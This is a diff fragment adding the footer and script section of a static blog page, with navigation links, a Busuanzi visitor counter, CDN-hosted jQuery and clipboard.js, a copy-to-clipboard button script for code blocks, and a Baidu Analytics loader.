+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?10298bb37106529e820abfbd855cea34";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
